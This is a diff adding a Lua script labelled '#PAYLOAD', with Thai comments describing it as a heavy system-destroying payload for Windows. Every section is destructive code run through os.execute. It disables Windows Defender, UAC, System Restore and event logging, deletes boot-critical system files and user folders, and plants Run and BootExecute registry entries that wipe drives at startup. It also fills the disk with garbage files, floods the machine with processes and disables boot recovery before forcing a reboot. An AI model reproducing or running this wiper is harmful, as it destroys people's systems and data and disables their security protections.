@@ -1,0 +1,59 @@
+#PAYLOAD:
+-- ============================================
+-- PAYLOAD ทำลายล้างระบบหนักๆ
+-- ============================================
+
+-- 1. ปิด Windows Defender และบริการรักษาความปลอดภัย
+pcall(os.execute, 'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
+pcall(os.execute, 'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f')
+pcall(os.execute, 'net stop WinDefend /y')
+pcall(os.execute, 'sc config WinDefend start= disabled')
+
+-- 2. ลบไฟล์ระบบที่สำคัญ (ทำให้ Windows บูตไม่ติด)
+pcall(os.execute, 'del /f /s /q C:\\Windows\\System32\\winload.exe')
+pcall(os.execute, 'del /f /s /q C:\\Windows\\System32\\winload.efi')
+pcall(os.execute, 'del /f /s /q C:\\Windows\\System32\\ntoskrnl.exe')
+pcall(os.execute, 'del /f /s /q C:\\Windows\\System32\\hal.dll')
+pcall(os.execute, 'del /f /s /q C:\\Windows\\System32\\drivers\\*.sys')
+
+-- 3. เปลี่ยนค่า Registry ให้เครื่องพัง
+pcall(os.execute, 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk * \\ncmd.exe /c del /f /s /q C:\\*.*" /f')
+pcall(os.execute, 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemCrash /t REG_SZ /d "cmd.exe /c del /f /s /q C:\\Windows\\System32\\*.*" /f')
+pcall(os.execute, 'reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog /v Start /t REG_DWORD /d 4 /f')
+
+-- 4. ลบข้อมูลผู้ใช้และไฟล์สำคัญ
+pcall(os.execute, 'rd /s /q C:\\Users\\Public\\Documents')
+pcall(os.execute, 'rd /s /q C:\\Users\\%USERNAME%\\Desktop')
+pcall(os.execute, 'rd /s /q C:\\Users\\%USERNAME%\\Downloads')
+pcall(os.execute, 'del /f /s /q C:\\Users\\%USERNAME%\\AppData\\Local\\*.*')
+
+-- 5. สร้างไฟล์ขยะเต็มไดรฟ์ C:
+for i = 1, 500 do
+    local f = io.open("C:\\garbage_" .. i .. ".bin", "w")
+    if f then
+        f:write(string.rep("A", 100 * 1024 * 1024))  -- 100MB ต่อไฟล์
+        f:close()
+    end
+end
+
+-- 6. เปิดโปรแกรมและกระบวนการค้างไว้เยอะๆ
+for i = 1, 50 do
+    pcall(os.execute, 'start calc.exe')
+    pcall(os.execute, 'start notepad.exe')
+    pcall(os.execute, 'start cmd.exe /c "ping 127.0.0.1 -t"')
+    pcall(os.execute, 'start cmd.exe /c "dir /s C:\\"')
+end
+
+-- 7. ปิดการทำงานของ System Restore และ UAC
+pcall(os.execute, 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f')
+pcall(os.execute, 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f')
+
+-- 8. เปลี่ยน Wallpaper เป็นข้อความหลอน
+pcall(os.execute, 'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg" /f')
+pcall(os.execute, 'reg add "HKCU\\Control Panel\\Desktop" /v WallpaperStyle /t REG_SZ /d "2" /f')
+pcall(os.execute, 'reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "" /f')
+
+-- 9. สุดท้าย: บูตวนไม่จบ
+pcall(os.execute, 'bcdedit /set {default} bootstatuspolicy ignoreallfailures')
+pcall(os.execute, 'bcdedit /set {default} recoveryenabled No')
+pcall(os.execute, 'shutdown /r /t 0')
